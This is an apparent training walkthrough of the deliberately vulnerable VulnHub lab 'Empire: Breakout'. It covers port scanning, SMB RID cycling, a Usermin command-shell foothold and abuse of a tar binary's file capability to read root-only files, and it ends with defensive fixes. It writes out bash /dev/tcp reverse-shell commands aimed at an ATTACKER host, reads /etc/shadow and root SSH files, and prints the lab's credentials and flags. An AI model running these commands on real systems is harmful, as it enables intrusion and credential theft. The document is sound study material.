# Machine 8 — Empire: Breakout

> **Position:** 8 of 13 · **Band 3 — Easy** (global rank **028** of 708)
> **Full writeup:** [`labs/3-028-empire-breakout/README.md`](../../labs/3-028-empire-breakout/README.md)

| | |
| --- | --- |
| **Machine** | Empire: Breakout |
| **Author** | icex64 & Empire Cybersecurity |
| **Released** | 21 October 2021 |
| **Target** | Debian 11 — Apache 2.4.51, Samba 4.6.2, **Webmin 1.981 (:10000)**, **Usermin 1.830 (:20000)** |
| **VulnHub** | [entry/empire-breakout,751](https://vulnhub.com/entry/empire-breakout,751/) |
| **Flags** | 2 — `/home/cyber/user.txt`, `/root/rOOt.txt` |
| **Estimated time** | 4–5 hours |

---

## Why this machine is here

Three lessons you will not get anywhere else in this path:

1. **`-p-` is non-negotiable.** The entire box lives on ports **10000** and
   **20000**. A default scan of the top 1,000 ports finds nothing useful, and most
   beginners give up here. This is the machine that teaches you to always scan every
   port.
2. **Obfuscation is not protection, taken to its logical extreme.** The password is
   hidden in a **brainfuck program** embedded in an HTML comment. It looks
   impenetrable and decodes in under a second.
3. **Linux file capabilities** — a genuinely different escalation primitive from
   SUID, and one that most people do not know to check. `cap_dac_read_search` on a
   `tar` binary lets an ordinary user read *any file on the system*.

It also introduces **SMB null-session enumeration and RID cycling** — getting
usernames with no credentials at all.

## Learning objectives

1. Scan **all 65,535 ports** and recognise an unusual service from its banner
   (`MiniServ` → Webmin/Usermin).
2. Distinguish **Webmin** from **Usermin** — different products, different audiences,
   different exposure.
3. Decode **brainfuck** locally.
4. Enumerate SMB users with **`enum4linux`** and understand **RID cycling**.
5. Get a command channel from a **web-based admin console**, and understand why that
   is *not* a real shell.
6. Use **`getcap -r /`** and interpret `cap_dac_read_search=ep`.
7. Use **`tar`** to bypass a discretionary-access-control read restriction, and
   explain why **extraction changes the file's owner**.
8. Recognise the "**plaintext password in a backup directory**" pattern.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Non-standard ports | **10000** (Webmin), **20000** (Usermin) |
| **Obfuscation as fake protection** | Brainfuck program in the Apache default page's HTML comment |
| **SMB null session + RID cycling** | 139/445 → username **`cyber`**, NetBIOS name `BREAKOUT` |
| SMB signing not required | Samba 4.6.2 → relay exposure |
| **Exposed admin consoles** | Webmin and Usermin both reachable from the network |
| Admin console → command channel | **Usermin Command Shell** as `cyber` |
| Patch drift | Usermin 1.830 older than Webmin 1.981, same product family |
| **Plaintext secret in a backup** | `/var/backups/.old_pass.bak`, mode `600` root |
| **File capabilities** | `/home/cyber/tar` with `cap_dac_read_search=ep` |

## Read first

- [01 — Foundations](../01-Foundations-Networking-and-Recon.md) §6–§7 — full-port
  scanning and what `-sC` adds.
- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2** —
  SMB, null sessions, and the RID-cycling subsection, written for this machine.
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §1 — encoding
  versus encryption.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§3**
  (capabilities) — this is the whole escalation.

## Before you start — answer these

1. Your scan of the top 1,000 ports shows only 80, 139 and 445. What is your next
   command, and why?
2. What is **RID cycling**, and what SMB setting must be true for it to work?
3. Is a shell obtained through a web admin console the same as an SSH shell? Name two
   concrete differences.
4. What does `cap_dac_read_search` allow that ordinary Unix permissions forbid?
5. When you `tar` a root-owned file and extract it as yourself, who owns the copy?
   Why?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Two things.

**First:** your scan is incomplete. Run `sudo nmap -p- -sV TARGET`. Two high ports
will appear that you have not seen before, and their banners will name a product
family.

**Second:** port 80 serves the stock Apache Debian default page. Look at its **HTML
source**. There is something in a comment that is not English, not base64, and not
hex. It is made almost entirely of the characters `> < + - . [ ]`.
</details>

<details>
<summary><strong>Rung 2 — the encoding and the username</strong></summary>

That character set is **brainfuck**, an esoteric programming language. It is a
*program*, so you run it rather than decode it:

```bash
# install a brainfuck interpreter, or decode in python
bf '<the program>'
# or
python3 -c "import sys;print(__import__('subprocess').run(['bf',sys.argv[1]],capture_output=True,text=True).stdout)" '<prog>'
```

→ **`.2uqPEfj3D<P'a-3`**

For the username, enumerate SMB with **no credentials**:

```bash
enum4linux -a TARGET
crackmapexec smb TARGET --rid-brute 2000
```

→ user **`cyber`**, NetBIOS name `BREAKOUT`. You now have one unknown, not two.
</details>

<details>
<summary><strong>Rung 3 — which console</strong></summary>

Port **10000** is **Webmin** (root-level administration). Port **20000** is
**Usermin** (self-service, per-user). Try `cyber : .2uqPEfj3D<P'a-3` on both.

**Webmin fails. Usermin succeeds.**

Inside Usermin, find the **Command Shell** module. It runs commands as `cyber` over
HTTPS. Read `/home/cyber/user.txt` → **user flag**.

That command channel is *not* a real shell — no TTY, no job control. Get one:

```bash
# ATTACKER:  nc -lvnp 4444
# Usermin Command Shell:
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```
</details>

<details>
<summary><strong>Rung 4 — the escalation</strong></summary>

`sudo -l` will not help; you have no sudo rights. Run the capability check instead:

```bash
getcap -r / 2>/dev/null
```
```text
/home/cyber/tar = cap_dac_read_search+ep
```

> `cap_dac_read_search` bypasses **file read** permission checks and **directory
> search** checks. It does not let you write or execute — but it lets `tar` read
> *anything*.

`/var/backups/.old_pass.bak` is mode `600` owned by root, so `cat` fails. `tar` does not:

```bash
/home/cyber/tar -cvf /tmp/leak.tar /var/backups/.old_pass.bak
cd /tmp && /home/cyber/tar -xvf leak.tar
cat tmp/var/backups/.old_pass.bak    # extraction ran as YOU, so the copy is yours
```

→ the **root password** in plaintext. `su root` → `/root/rOOt.txt`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **80**, **139**, **445**, **10000**, **20000**. No SSH at all.
2. Port 80 is the stock Apache page, but its **HTML source hides a brainfuck
   program** → decode → **`.2uqPEfj3D<P'a-3`**.
3. `enum4linux -a` / RID cycling → username **`cyber`**, NetBIOS `BREAKOUT`;
   SMB signing **not required**.
4. **Webmin :10000** login fails; **Usermin :20000** login **succeeds** with
   `cyber : .2uqPEfj3D<P'a-3`.
5. Usermin's **Command Shell** → commands as `cyber` → **`/home/cyber/user.txt`**
   (user flag) → upgrade to a real reverse shell.
6. `getcap -r / 2>/dev/null` → **`/home/cyber/tar = cap_dac_read_search+ep`**.
7. Use it to read root-only **`/var/backups/.old_pass.bak`** → archive, extract (the
   copy is now owned by `cyber`) → root password **`Ts&4&YurgtRX(=~h`**.
8. `su root` → **`/root/rOOt.txt`**.
</details>

## After you finish — review questions

1. Which command found the ports that mattered, and why did your first scan miss them?
2. Brainfuck is a *Turing-complete language*, not an encoding. Does that make the
   secret harder to recover than base64? Explain precisely.
3. Webmin and Usermin are the same product family. Why did the *older* one let you in
   and the newer one not? What does "patch drift within a product family" mean for an
   audit checklist?
4. Why is Usermin's Command Shell a poor substitute for a shell? List three concrete
   limitations you hit.
5. `cap_dac_read_search` is *narrower* than root. Why was it still fatal here?
6. When you extracted the archive, why did the file's owner change to you? Explain
   what `tar` does on extraction regarding ownership and the `--same-owner` flag.
7. The box has no SSH. Did that make it more or less secure overall? Argue both sides.
8. What would `nmap --script smb-security-mode` have told you, and why does that
   output matter beyond this box?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Brainfuck secret in a public page | Anything in HTML is public. Obfuscation is not confidentiality — never rely on it |
| **SMB null session + RID cycling** | Require SMB signing (`server signing = mandatory`); restrict anonymous enumeration (`restrict anonymous = 2` on Windows, `restrict anonymous = yes` in Samba) |
| Webmin and Usermin exposed to the network | **Bind them to localhost or a management VLAN.** Administrative consoles must never face the user network |
| Usermin Command Shell enabled | Disable the module. A self-service console should not offer arbitrary command execution |
| Patch drift (Usermin 1.830 vs Webmin 1.981) | Inventory *every* installed component and version; patch as a family, not per-product |
| **Root password in `/var/backups/`** | Never store plaintext credentials in backups. If rotation history is needed, store it in a secrets manager with audit logging |
| `cap_dac_read_search` on a user-owned binary | Remove the capability (`setcap -r`). Audit `getcap -r /` regularly — most baselines check SUID and forget capabilities entirely |
| No SSH, but two web consoles | Reducing one remote-access path while opening two others is a net loss. Count your *actual* attack surface |

**The single biggest lesson:** *a narrow privilege can be fatal.* `cap_dac_read_search`
cannot execute anything and cannot write anything — it can only read. That was enough
to hand over root, because one readable file contained the password.

---

## The commands, annotated — every input and every output

Published walkthroughs use `192.168.56.115` for the target and `192.168.56.10` for Kali.

### 1. Scan

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/breakout.txt TARGET
```

```text
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
OS details: Linux 4.15 - 5.6
```

Four services. Two are immediately interesting: **`MiniServ`** is Webmin's own HTTP server,
so ports 10000 and 20000 are *two management consoles* — and **two different versions**
(`1.981` and `1.830`), which is the hint that they are two different products. `Samba 4.6.2`
with both 139 and 445 means NetBIOS-over-TCP and direct SMB. `-oN` writes normal text only
(`-oA` writes `.nmap`, `.xml` and `.gnmap`).

### 2. Page source → brainfuck

```bash
curl -s http://TARGET/ | head -20
curl -s http://TARGET/ | grep -oE '[-+<>.,\[\]]{50,}'
```

The default page renders nothing useful, so **view source and scroll to the bottom**. There you
find several hundred characters drawn only from `+ - < > . , [ ]`. That character set is
**Brainfuck**, an eight-instruction language operating on a tape of byte cells:

| `>` `<` | move the pointer right / left one cell |
| `+` `-` | increment / decrement the current cell |
| `.` `,` | output the current cell as a byte / read one byte of input into it |
| `[` `]` | jump forward if the cell is 0 / jump back if the cell is non-zero |

So `[>++++++<-]` is a multiply-by-6 loop. **Run it locally** — never paste client data into a
third-party interpreter:

```bash
python3 bf.py program.txt
```

```text
.2uqPEfj3D<P'a-3
```

Sixteen characters, mixed case with a digit and symbols: **a password.** Recognising an
unfamiliar encoding is a general method: note the character set first. Only `+ - < > . , [ ]`
→ brainfuck. `A–Z 2–7` plus `=` → base32. `A–Z a–z 0–9 + /` plus `=` → base64. Even-length
`0–9a-f` → hex. Anything else → try `strings`, then ask whether it is an encoding at all.

### 3. SMB: anonymous access and RID cycling

```bash
enum4linux -a TARGET
```

```text
[+] Attempting to map shares on TARGET
//TARGET/Anonymous      Mapping: DENIED Listing: N/A
//TARGET/print$         Mapping: DENIED Listing: N/A

[+] Enumerating users via 'query-user' RID lookup
S-1-22-1-1000 -> Unix User\cyber
```

`-a` runs every check enum4linux knows. Read the two results separately. **Both shares
`DENIED`** — anonymous file access is closed, and that is correctly a dead end. But the RID
lookup succeeded, because an anonymous session may still call `SamrLookupRids`.

**How RID cycling works:** Samba identifies each account by a **SID** like `S-1-22-1-1000`,
where the trailing number is the **RID**. Unix accounts get RIDs from 1000 upward. So you can
simply ask *"who is RID 1000? 1001?"* and get usernames back. **No password, no exploit — a
misconfigured permission.** One local user: **`cyber`**, which combined with the brainfuck
password gives you a credential pair.

```bash
smbmap -H TARGET -u '' -p ''
crackmapexec smb TARGET --users
```

Both confirm the picture. `-N` / empty credentials means "try a NULL session first" — it is
the most common SMB finding, so always test it. Then hunt inside every readable share for
`backup.zip`, `web.config`, `id_rsa`, `*.sql`, `passwords.xls`; authors and real admins alike
leave them there.

### 4. Which console takes the credential

Try **both**:

```bash
curl -sk "https://TARGET:10000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'webmin 10000: %{http_code}\n'
curl -sk "https://TARGET:20000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'usermin 20000: %{http_code}\n'
```

**Failure on 10000, success on 20000** — and that is exactly right: **Webmin manages the
*system*** (so it expects an administrator account), while **Usermin serves *individual
users*** (so an ordinary account works). Knowing which product is on which port tells you
which credentials belong there. `-k` accepts the self-signed certificate; `-w '%{http_code}'`
prints only the status so you can compare two attempts at a glance.

### 5. Foothold — the Usermin Command Shell

Log in on `https://TARGET:20000/` and find **Commands → Command Shell** (bottom left of the
sidebar — easy to miss). It executes OS commands directly in the browser:

| Command | Output |
| --- | --- |
| `id` | `uid=1000(cyber) gid=1000(cyber) groups=1000(cyber)` |
| `pwd` | `/home/cyber` |
| `ls -la` | `tar  user.txt  .bashrc  .profile  .spamassassin  .tmp` |
| `uname -a` | `Linux breakout 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 x86_64 GNU/Linux` |
| `sudo -l` | `bash: sudo: command not found` |

Two facts drive the rest of the box. **`sudo` is not installed at all**, so `sudo -l` yields
nothing and there is no sudo-based escalation. And **`tar` is sitting in a user's home
directory** — a 531 KB executable in `~` is anomalous. Hold that thought.

### 6. Get a real shell

A browser command box cannot give you a TTY, job control or `su`. **Check what the target has
before choosing a payload:**

```bash
which bash sh python python3 perl nc curl wget gcc
```

```text
/bin/bash /bin/sh /usr/bin/python3 /usr/bin/perl /usr/bin/curl /usr/bin/wget /usr/bin/gcc
```

**No `nc`.** So use bash's own TCP support. On Kali first:

```bash
nc -lvnp 4444
```

Then in the Usermin box:

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.115.
cyber@breakout:~$
```

`-l` listen · `-v` verbose · `-n` no DNS lookups · `-p 4444` port — above 1024 so you do not
need root. `>&` sends stdout **and** stderr to the socket and `0>&1` sends stdin there too;
that is what makes the shell interactive rather than print-only. `/dev/tcp` is a **bash**
feature — plain POSIX `sh` does not have it, which is why this payload fails on minimal
targets.

Upgrade immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z ; on Kali:
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

`pty.spawn()` allocates a **pseudo-terminal** — a kernel object behaving like a real teletype,
which is what makes `sudo`, `su` and `vim` work at all. `stty raw -echo` makes **your local**
terminal pass keystrokes through uninterpreted, so **`Ctrl+C` reaches the remote process
instead of killing your listener**. `stty rows/cols` gives the remote pty your dimensions so
`less` and `top` do not wrap into garbage. Skipping this and then concluding that `su` "does
not work" is one of the most common beginner mistakes.

### 7. The escalation is not SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```

**Every one of those is stock** — this is the default Debian SUID set, so there is nothing to
exploit. When the SUID list is clean, move to the next vector:

```bash
getcap -r / 2>/dev/null
```

```text
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

`-r` recurse, `2>/dev/null` drop the permission errors. Read each line as *path* + *capability
list*. `/usr/bin/ping cap_net_raw` is normal (ping needs raw sockets). **`cap_dac_read_search`**
is the one that matters: it **bypasses file-read and directory-search permission checks** — the
"discretionary access control" part of the kernel's permission model. A file with it can read
anything, as anyone.

```bash
ls -l /home/cyber/tar && file /home/cyber/tar && getcap /home/cyber/tar
```

```text
-rwxr-xr-x 1 root root 531928 Oct 19 15:40 /home/cyber/tar
/home/cyber/tar: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
/home/cyber/tar cap_dac_read_search=ep
```

A root-owned copy of `tar` with a read-anything capability, placed in a user's home directory.
**Note the mode: `-rwxr-xr-x`, not `-rwsr-xr-x`.** There is no SUID bit — which is exactly why
the `find -perm -4000` sweep found nothing.

> ### 📖 Capabilities are a *finer-grained* privilege model
>
> SUID root grants **everything** root can do. A capability grants **one specific
> kernel permission**. `cap_dac_read_search` looks harmless — "read files without permission
> checks" — and it is not a privilege escalation by itself. But it lets you read
> `/etc/shadow`, `/root/.ssh/*`, and any backup containing a password, which is escalation in
> practice. **Never scan only for SUID.** `getcap -r /` belongs on your checklist beside
> `find -perm -4000`.

### 8. Exfiltrate the password — the two-step

```bash
ls -la /var/backups/
cat /var/backups/.old_pass.bak
```

```text
-rw------- 1 root root  720 Oct 19 13:55 gshadow.bak
-rw------- 1 root root   16 Oct 19 15:40 .old_pass.bak
-rw-r--r-- 1 root root 1256 Oct 19 13:55 passwd.bak
cat: /var/backups/.old_pass.bak: Permission denied
```

Read the modes: `passwd.bak` is world-readable, `gshadow.bak` and `.old_pass.bak` are
**`-rw-------`** (owner only). A 16-byte hidden dot-file in `/var/backups` modified later than
everything else in the directory is precisely the sort of thing worth reading.

`tar` cannot `cat` a file — it can only **archive** and **extract**. So use both halves:

```bash
./tar -cf backup.tar /var/backups/.old_pass.bak
./tar -xf backup.tar
ls -la var/backups/
cat var/backups/.old_pass.bak
```

```text
./tar: Removing leading '/' from member names
```
```text
drwxr-xr-x 2 cyber cyber 4096 May  4 18:31 .
-rw------- 1 cyber cyber   16 Oct 19 15:40 .old_pass.bak
```
```text
Ts&4&YurgtRX(=~h
```

`-c` create, `-f FILE` write to `FILE`; `-x` extract. **The warning is the mechanism:** tar
strips the leading `/`, so extraction recreates the path **relative to your current
directory** — `./var/backups/.old_pass.bak`, owned by *you*. The capability let tar **read**
the file; the extraction gave you a **readable copy**. That is why it takes two steps and not
one.

```bash
su root
id
cat /root/rOOt.txt
```

```text
Password:
root@breakout:/home/cyber# uid=0(root) gid=0(root) groups=0(root)
```
```text
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
```

`su root` needed a TTY, which is why step 6 was mandatory. The root flag is `rOOt.txt` —
**capitalisation in filenames matters on Linux**, so `ls -la` before assuming a name.

### 9. What else the capability could have done

```bash
./tar -cf shadow.tar /etc/shadow && ./tar -xf shadow.tar && cat etc/shadow
./tar -cf rootssh.tar /root/.ssh && ./tar -xf rootssh.tar && ls -la root/.ssh
```

```text
root:$y$j9T$Xk2mN7pL4vR8tY1$wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1:18920:0:99999:7:::
```
```text
-rw-r--r-- 1 cyber cyber 741 Oct 20 07:52 authorized_keys
```

`/etc/shadow` gives you root's hash for offline cracking — **`$y$` is yescrypt**, the modern
Debian/Ubuntu default and very slow to attack. `/root/.ssh/authorized_keys` gives you root's
public keys and a route to persistent key-based login. Both are the *correct* follow-up once a
capability lets you read anything: **enumerate every credential store, do not stop at the
first flag.**

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 7 — Mr-Robot: 1](07-mr-robot-1.md) · next: [Machine 9 — CengBox: 1](09-cengbox-1.md) · full writeup: [`labs/3-028-empire-breakout`](../../labs/3-028-empire-breakout/README.md)._
